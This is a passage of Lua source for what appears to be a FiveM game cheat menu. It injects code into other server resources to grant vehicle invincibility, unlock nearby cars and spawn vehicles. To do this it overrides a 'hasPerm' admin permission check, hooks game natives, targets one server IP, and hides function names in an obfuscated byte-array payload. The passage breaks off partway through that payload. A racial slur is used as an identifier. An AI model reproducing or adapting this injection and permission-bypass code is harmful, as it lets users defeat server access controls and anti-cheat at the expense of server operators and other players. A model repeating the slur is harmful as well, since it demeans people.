        {
            name = 'Main Menu',
            submenu = {
                {
                    label = "Vehicle God Mode",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                _G.VehicleGodMode = true

                                CreateThread(function()
                                    while _G.VehicleGodMode do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and veh ~= 0 then
                                            SetEntityInvincible(veh, true)
                                            SetVehicleCanBeVisiblyDamaged(veh, false)
                                            SetVehicleTyresCanBurst(veh, false)
                                            SetVehicleWheelsCanBreak(veh, false)
                                            SetVehicleEngineCanDegrade(veh, false)
                                            SetVehicleExplodesOnHighExplosionDamage(veh, false)
                                        end
                                        Wait(0)
                                    end
                                end)
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.VehicleGodMode = true

                                CreateThread(function()
                                    while _G.VehicleGodMode do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and veh ~= 0 then
                                            SetEntityInvincible(veh, true)
                                            SetVehicleCanBeVisiblyDamaged(veh, false)
                                            SetVehicleTyresCanBurst(veh, false)
                                            SetVehicleWheelsCanBreak(veh, false)
                                            SetVehicleEngineCanDegrade(veh, false)
                                            SetVehicleExplodesOnHighExplosionDamage(veh, false)
                                        end
                                        Wait(0)
                                    end
                                end)
                            end
                            sendNotification("Vehicle God Mode", "Enabled", "success", 2000)
                        else
                            local code = [[
                                _G.VehicleGodMode = false
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh and veh ~= 0 then
                                    SetEntityInvincible(veh, false)
                                    SetVehicleCanBeVisiblyDamaged(veh, true)
                                    SetVehicleTyresCanBurst(veh, true)
                                    SetVehicleWheelsCanBreak(veh, true)
                                    SetVehicleEngineCanDegrade(veh, true)
                                    SetVehicleExplodesOnHighExplosionDamage(veh, true)
                                end
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.VehicleGodMode = false
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh and veh ~= 0 then
                                    SetEntityInvincible(veh, false)
                                    SetVehicleCanBeVisiblyDamaged(veh, true)
                                    SetVehicleTyresCanBurst(veh, true)
                                    SetVehicleWheelsCanBreak(veh, true)
                                    SetVehicleEngineCanDegrade(veh, true)
                                    SetVehicleExplodesOnHighExplosionDamage(veh, true)
                                end
                            end
                            sendNotification("Vehicle God Mode", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Toggle Engine On",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsIn(ped, false)

                                if veh and DoesEntityExist(veh) and veh ~= 0 then
                                    if not NetworkHasControlOfEntity(veh) then
                                        NetworkRequestControlOfEntity(veh)
                                        Wait(100)
                                    end
                                    SetVehicleEngineOn(veh, true, true, true)
                                    SetVehicleUndriveable(veh, false)
                                    SetVehicleNeedsToBeHotwired(veh, false)
                                end
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsIn(ped, false)

                                if veh and DoesEntityExist(veh) and veh ~= 0 then
                                    if not NetworkHasControlOfEntity(veh) then
                                        NetworkRequestControlOfEntity(veh)
                                        Wait(100)
                                    end
                                    SetVehicleEngineOn(veh, true, true, true)
                                    SetVehicleUndriveable(veh, false)
                                    SetVehicleNeedsToBeHotwired(veh, false)
                                end
                            end
                            sendNotification("Engine", "Turned ON", "success", 2000)
                        else
                            local code = [[
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsIn(ped, false)

                                if veh and DoesEntityExist(veh) and veh ~= 0 then
                                    if not NetworkHasControlOfEntity(veh) then
                                        NetworkRequestControlOfEntity(veh)
                                        Wait(100)
                                    end
                                    SetVehicleEngineOn(veh, false, true, true)
                                    SetVehicleUndriveable(veh, true)
                                end
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsIn(ped, false)

                                if veh and DoesEntityExist(veh) and veh ~= 0 then
                                    if not NetworkHasControlOfEntity(veh) then
                                        NetworkRequestControlOfEntity(veh)
                                        Wait(100)
                                    end
                                    SetVehicleEngineOn(veh, false, true, true)
                                    SetVehicleUndriveable(veh, true)
                                end
                            end
                            sendNotification("Engine", "Turned OFF", "info", 2000)
                        end
                    end
                },
                {
                    label = "Infinite Fuel",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                _G.InfiniteGas = true

                                CreateThread(function()
                                    while _G.InfiniteGas do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and DoesEntityExist(veh) then
                                            SetVehicleFuelLevel(veh, 100.0)
                                        end
                                        Wait(500)
                                    end
                                end)
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.InfiniteGas = true

                                CreateThread(function()
                                    while _G.InfiniteGas do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and DoesEntityExist(veh) then
                                            SetVehicleFuelLevel(veh, 100.0)
                                        end
                                        Wait(500)
                                    end
                                end)
                            end
                            sendNotification("Infinite Fuel", "Enabled", "success", 2000)
                        else
                            local code = [[_G.InfiniteGas = false]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.InfiniteGas = false
                            end
                            sendNotification("Infinite Fuel", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Bypass Vehicle Lock",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                _G.MoonUnlockLoop = true

                                CreateThread(function()
                                    while _G.MoonUnlockLoop do
                                        local p = PlayerPedId()
                                        local c = GetEntityCoords(p)
                                        local v = GetClosestVehicle(c.x, c.y, c.z, 5.0, 0, 71)

                                        if v and DoesEntityExist(v) then
                                            SetEntityAsMissionEntity(v, true, true)
                                            SetVehicleDoorsLocked(v, 1)
                                            SetVehicleDoorsLockedForAllPlayers(v, false)
                                            SetVehicleDoorsLockedForPlayer(v, PlayerId(), false)
                                        end

                                        Wait(1000)
                                    end
                                end)
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.MoonUnlockLoop = true

                                CreateThread(function()
                                    while _G.MoonUnlockLoop do
                                        local p = PlayerPedId()
                                        local c = GetEntityCoords(p)
                                        local v = GetClosestVehicle(c.x, c.y, c.z, 5.0, 0, 71)

                                        if v and DoesEntityExist(v) then
                                            SetEntityAsMissionEntity(v, true, true)
                                            SetVehicleDoorsLocked(v, 1)
                                            SetVehicleDoorsLockedForAllPlayers(v, false)
                                            SetVehicleDoorsLockedForPlayer(v, PlayerId(), false)
                                        end

                                        Wait(1000)
                                    end
                                end)
                            end
                            sendNotification("Vehicle Lock Bypass", "Enabled", "success", 2000)
                        else
                            local code = [[_G.MoonUnlockLoop = false]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.MoonUnlockLoop = false
                            end
                            sendNotification("Vehicle Lock Bypass", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Instant Brakes",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                _G.BrakeEnabled = true

                                CreateThread(function()
                                    while _G.BrakeEnabled do
                                        Wait(0)
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and DoesEntityExist(veh) then
                                            SetVehicleForwardSpeed(veh, 0.0)
                                            SetVehicleBrakeLights(veh, true)
                                            SetVehicleHandbrake(veh, true)
                                        end
                                    end
                                end)
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.BrakeEnabled = true

                                CreateThread(function()
                                    while _G.BrakeEnabled do
                                        Wait(0)
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and DoesEntityExist(veh) then
                                            SetVehicleForwardSpeed(veh, 0.0)
                                            SetVehicleBrakeLights(veh, true)
                                            SetVehicleHandbrake(veh, true)
                                        end
                                    end
                                end)
                            end
                            sendNotification("Instant Brakes", "Locked ON", "success", 2000)
                        else
                            local code = [[_G.BrakeEnabled = false]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.BrakeEnabled = false
                            end
                            sendNotification("Instant Brakes", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Drift Mode (Hold Shift)",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                _G.DriftEnabled = true

                                CreateThread(function()
                                    while _G.DriftEnabled do
                                        Wait(0)
                                        if IsControlPressed(0, 21) then
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and DoesEntityExist(veh) then
                                                SetVehicleReduceGrip(veh, true)
                                                SetVehicleEnginePowerMultiplier(veh, 1.5)
                                            end
                                        else
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and DoesEntityExist(veh) then
                                                SetVehicleReduceGrip(veh, false)
                                                SetVehicleEnginePowerMultiplier(veh, 1.0)
                                            end
                                        end
                                    end
                                end)
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.DriftEnabled = true

                                CreateThread(function()
                                    while _G.DriftEnabled do
                                        Wait(0)
                                        if IsControlPressed(0, 21) then
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and DoesEntityExist(veh) then
                                                SetVehicleReduceGrip(veh, true)
                                                SetVehicleEnginePowerMultiplier(veh, 1.5)
                                            end
                                        else
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and DoesEntityExist(veh) then
                                                SetVehicleReduceGrip(veh, false)
                                                SetVehicleEnginePowerMultiplier(veh, 1.0)
                                            end
                                        end
                                    end
                                end)
                            end
                            sendNotification("Drift Mode", "Enabled (Hold Shift)", "success", 2000)
                        else
                            local code = [[
                                _G.DriftEnabled = false
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh and DoesEntityExist(veh) then
                                    SetVehicleReduceGrip(veh, false)
                                    SetVehicleEnginePowerMultiplier(veh, 1.0)
                                end
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.DriftEnabled = false
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh and DoesEntityExist(veh) then
                                    SetVehicleReduceGrip(veh, false)
                                    SetVehicleEnginePowerMultiplier(veh, 1.0)
                                end
                            end
                            sendNotification("Drift Mode", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Auto Repair",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                _G.AutoRepairEnabled = true

                                CreateThread(function()
                                    while _G.AutoRepairEnabled do
                                        Wait(1000)
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and DoesEntityExist(veh) then
                                            SetVehicleFixed(veh)
                                            SetVehicleDeformationFixed(veh)
                                            SetVehicleUndriveable(veh, false)
                                        end
                                    end
                                end)
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.AutoRepairEnabled = true

                                CreateThread(function()
                                    while _G.AutoRepairEnabled do
                                        Wait(1000)
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and DoesEntityExist(veh) then
                                            SetVehicleFixed(veh)
                                            SetVehicleDeformationFixed(veh)
                                            SetVehicleUndriveable(veh, false)
                                        end
                                    end
                                end)
                            end
                            sendNotification("Auto Repair", "Enabled", "success", 2000)
                        else
                            local code = [[_G.AutoRepairEnabled = false]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.AutoRepairEnabled = false
                            end
                            sendNotification("Auto Repair", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Rainbow Vehicle",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                _G.RainbowEnabled = true

                                CreateThread(function()
                                    while _G.RainbowEnabled do
                                        Wait(150)
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and DoesEntityExist(veh) then
                                            local r = math.random(0,255)
                                            local g = math.random(0,255)
                                            local b = math.random(0,255)
                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                        end
                                    end
                                end)
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.RainbowEnabled = true

                                CreateThread(function()
                                    while _G.RainbowEnabled do
                                        Wait(150)
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and DoesEntityExist(veh) then
                                            local r = math.random(0,255)
                                            local g = math.random(0,255)
                                            local b = math.random(0,255)
                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                        end
                                    end
                                end)
                            end
                            sendNotification("Rainbow Vehicle", "Activated", "success", 2000)
                        else
                            local code = [[_G.RainbowEnabled = false]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.RainbowEnabled = false
                            end
                            sendNotification("Rainbow Vehicle", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Bunny Hop (Press Space)",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                _G.HopEnabled = true

                                CreateThread(function()
                                    while _G.HopEnabled do
                                        Wait(0)
                                        if IsControlJustPressed(0, 22) then
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and DoesEntityExist(veh) then
                                                ApplyForceToEntity(veh, 1, 0.0, 0.0, 8.0, 0.0, 0.0, 0.0, 0, false, true, true,
                false, true)
                                            end
                                        end
                                    end
                                end)
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.HopEnabled = true

                                CreateThread(function()
                                    while _G.HopEnabled do
                                        Wait(0)
                                        if IsControlJustPressed(0, 22) then
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and DoesEntityExist(veh) then
                                                ApplyForceToEntity(veh, 1, 0.0, 0.0, 8.0, 0.0, 0.0, 0.0, 0, false, true, true,
                false, true)
                                            end
                                        end
                                    end
                                end)
                            end
                            sendNotification("Bunny Hop", "Enabled (Press Space)", "success", 2000)
                        else
                            local code = [[_G.HopEnabled = false]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                               _G.HopEnabled = false
                            end
                            sendNotification("Bunny Hop", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Turbo (Hold Shift)",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                _G.TurboEnabled = true

                                CreateThread(function()
                                    while _G.TurboEnabled do
                                        Wait(0)
                                        if IsControlPressed(0, 21) then
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and DoesEntityExist(veh) then
                                                SetVehicleBoostActive(veh, true)
                                                ModifyVehicleTopSpeed(veh, 70.0)

                                                local speed = GetEntitySpeed(veh)
                                                local fwd = GetEntityForwardVector(veh)
                                                SetVehicleForwardSpeed(veh, speed + 2.9)
                                            end
                                        end
                                    end
                                end)
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.TurboEnabled = true

                                CreateThread(function()
                                    while _G.TurboEnabled do
                                        Wait(0)
                                        if IsControlPressed(0, 21) then
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and DoesEntityExist(veh) then
                                                SetVehicleBoostActive(veh, true)
                                                ModifyVehicleTopSpeed(veh, 70.0)

                                                local speed = GetEntitySpeed(veh)
                                                local fwd = GetEntityForwardVector(veh)
                                                SetVehicleForwardSpeed(veh, speed + 2.9)
                                            end
                                        end
                                    end
                                end)
                            end
                            sendNotification("Turbo", "Enabled (Hold Shift)", "success", 2000)
                        else
                            local code = [[_G.TurboEnabled = false]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            else
                                _G.TurboEnabled = false
                            end
                            sendNotification("Turbo", "Disabled", "info", 2000)
                        end
                    end
                },                                                                
                {
                    label = "Spawn Vehicle",
                    type = "button",
                    onConfirm = function()
                        openInputDialog("Enter vehicle model:", 50, function(model)
                            if not model or model == "" then
                                sendNotification("Vehicle Spawn", "Invalid model name", "error", 2000)
                                return
                            end

                            local ped = PlayerPedId()
                            local ogCoords = GetEntityCoords(ped)
                            local ogHeading = GetEntityHeading(ped)
                            local serverEndpoint = GetCurrentServerEndpoint()
                            local teleportInto = true
                            local deletePrevious = true

                            if GetResourceState("solos-rentals") == "started" then
                                sendNotification("Vehicle Spawn", "Spawned Vehicle", "success", 3000)
                                Injection("solos-rentals", string.format([[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then return end
                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                end

                                
                                function EnumerateVehicles()
                                    return coroutine.wrap(function()
                                        local handle, vehicle = FindFirstVehicle()
                                        if not handle or handle == -1 then
                                            EndFindVehicle(handle)
                                            return
                                        end

                                        local success
                                        repeat
                                            coroutine.yield(vehicle)
                                            success, vehicle = FindNextVehicle(handle)
                                        until not success

                                        EndFindVehicle(handle)
                                    end)
                                end

                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                hNative("RequestModel", function(originalFn, model) return originalFn(model) end)
                                hNative("HasModelLoaded", function(originalFn, model) return originalFn(model) end)
                                hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                                    return originalFn(model, x, y, z, heading, networked, p6)
                                end)

                                local model = "%s"
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)
                                local playerHeading = GetEntityHeading(playerPed)
                                config.locations["customnigga"] = {
                                    vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
                                }

                                if %s then DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false)) end
                                TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

                                Citizen.CreateThread(function()
                                    Citizen.Wait(300)
                                    if %s then
                                        local coords = config.locations["customnigga"].vehiclespawncoords
                                        local x,y,z = coords.x, coords.y, coords.z
                                        local hash = GetHashKey(model)
                                        local vehicle = nil
                                        for ent in EnumerateVehicles() do
                                            if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) -
                            vector3(x,y,z)) < 5.0 then
                                                vehicle = ent
                                                break
                                            end
                                        end
                                        if vehicle and DoesEntityExist(vehicle) then
                                            TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                                        end
                                    else
                                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                                        SetEntityHeading(PlayerPedId(), %f)
                                    end
                                end)
                            ]], model, tostring(deletePrevious), tostring(teleportInto), ogCoords.x, ogCoords.y, ogCoords.z, ogHeading))

                            elseif GetResourceState("amigo") == "started" then
                                sendNotification("Vehicle Spawn", "Spawned Vehicle", "success", 3000)
                                Injection("adminMenu", string.format([[
                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                                    local model = "%s"
                                    if %s then DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false)) end

                                    local originalHasPerm = hasPerm
                                    hasPerm = function(perm) return true end
                                    local originalIsModelInCdimage = IsModelInCdimage
                                    IsModelInCdimage = function(model) return true end

                                    local veh = spawnVeh(model)

                                    hasPerm = originalHasPerm
                                    IsModelInCdimage = originalIsModelInCdimage

                                    Citizen.Wait(200)
                                    if %s then
                                        if veh and DoesEntityExist(veh) then
                                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1)
                                        end
                                    end
                                ]], model, tostring(deletePrevious), tostring(teleportInto)))

                            elseif targetResource then
                                sendNotification("Vehicle Spawn", "Spawned Vehicle", "success", 3000)
                                Injection(targetResource, string.format([[
                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                                    local model = "%s"
                                    local coords = GetEntityCoords(PlayerPedId())
                                    local heading = GetEntityHeading(PlayerPedId())

                                    if %s then DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false)) end

                                    ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                                        Citizen.Wait(200)
                                        if %s then
                                            if vehicle and DoesEntityExist(vehicle) then
                                                TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                                            end
                                        end
                                    end)
                                ]], model, tostring(deletePrevious), tostring(teleportInto)))

                            elseif GetResourceState("qb-core") == "started" then
                                sendNotification("Vehicle Spawn", "Spawned Vehicle", "success", 3000)
                                Injection("qb-core", [[
                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                                    local model = "]] .. model .. [["
                                    if ]] .. tostring(deletePrevious) .. [[ then
                                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                                    end

                                    QBCore.Functions.SpawnVehicle(model, function(veh)
                                        Citizen.Wait(200)
                                        if ]] .. tostring(teleportInto) .. [[ then
                                            if veh and DoesEntityExist(veh) then
                                                TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1)
                                            end
                                        else
                                            SetEntityCoords(PlayerPedId(), ]] .. ogCoords.x .. [[, ]] .. ogCoords.y .. [[, ]] ..
                ogCoords.z .. [[, false, false, false, false)
                                            SetEntityHeading(PlayerPedId(), ]] .. ogHeading .. [[)
                                        end
                                    end, GetEntityCoords(PlayerPedId()), true, true)
                                ]])

                            elseif serverEndpoint:match("([^:]+)") == "185.244.106.12" and GetResourceState("drc_gardener") ==
                "started" then
                                sendNotification("Vehicle Spawn", "Spawned Vehicle", "success", 3000)
                                Injection("drc_gardener", string.format([[
                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                                    local model = "%s"
                                    if %s then DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false)) end

                                    local ogCoords = GetEntityCoords(PlayerPedId())
                                    local ogHeading = GetEntityHeading(PlayerPedId())
                                    SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

                                    if not %s then
                                        SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false,
                false)
                                        SetEntityHeading(PlayerPedId(), ogHeading)
                                    end
                                ]], model, tostring(deletePrevious), tostring(teleportInto)))

                            elseif GetResourceState("lunar_bridge") == "started" then
                                sendNotification("Vehicle Spawn", "Spawned Vehicle", "success", 3000)
                                Injection("lunar_bridge", string.format([[
                                    local model = "%s"
                                    local ped = PlayerPedId()
                                    local coords = GetEntityCoords(ped)
                                    local heading = GetEntityHeading(ped)
                                    local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y +
                math.cos(math.rad(heading)) * 3.0, coords.z)

                                    if %s then DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false)) end

                                    Framework.spawnVehicle(model, offset, heading, function(vehicle)
                                        if not vehicle or not DoesEntityExist(vehicle) then return end
                                        SetVehicleOnGroundProperly(vehicle)
                                        Citizen.Wait(500)
                                        if %s then
                                            TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                                        end
                                    end)
                                ]], model, tostring(deletePrevious), tostring(teleportInto)))

                            elseif GetResourceState("lation_laundering") == "started" then
                                sendNotification("Vehicle Spawn", "Spawned Vehicle", "success", 3000)
                                Injection("lation_laundering", string.format([[
                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                                    local function spawnVehicle()
                                        local model = "%s"
                                        local ped = PlayerPedId()
                                        local coords = GetEntityCoords(ped)
                                        local heading = GetEntityHeading(ped)
                                        local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y +
                math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                                        DoScreenFadeOut(800)
                                        while not IsScreenFadedOut() do Citizen.Wait(100) end
                                        local vehicle = SpawnVehicle(model, position)
                                        if not vehicle or not DoesEntityExist(vehicle) then
                                            ShowNotification("~r~Error: Failed to spawn vehicle.")
                                            DoScreenFadeIn(800)
                                            return
                                        end
                                        SetVehicleOnGroundProperly(vehicle)
                                        Citizen.Wait(500)
                                        if %s then
                                            TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                                        end
                                        SetModelAsNoLongerNeeded(GetHashKey(model))
                                        DoScreenFadeIn(800)
                                        ShowNotification("~g~Vehicle spawned successfully!")
                                    end

                                    if %s then DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false)) end
                                    spawnVehicle()
                                ]], model, tostring(teleportInto), tostring(deletePrevious)))

                            elseif GetResourceState("monitor") == "started" or GetResourceState("ox_lib") == "started" then
                                sendNotification("Vehicle Spawn", "Spawned Vehicle", "success", 3000)

                                local function b(str)
                                    local t = {}
                                    for i = 1, #str do t[i] = string.byte(str, i) end
                                    return "{" .. table.concat(t, ",") .. "}"
                                end

                                local modelLit = b(model)
                                local deletePrev = tostring(deletePrevious)
                                local warpIn = tostring(teleportInto)

                                local payload = string.format([[
                                    local h = function(n, f)
                                        local o = _G[n]
                                        if o and type(o) == "function" then
                                            _G[n] = function(...) return f(o, ...) end
                                        end
                                    end
                                    local d = function(t)
                                        local s = ""
                                        for i = 1, #t do s = s .. string.char(t[i]) end
                                        return s
                                    end
                                    local g = function(e) return _G[d(e)] end

                                    h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
                                    h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
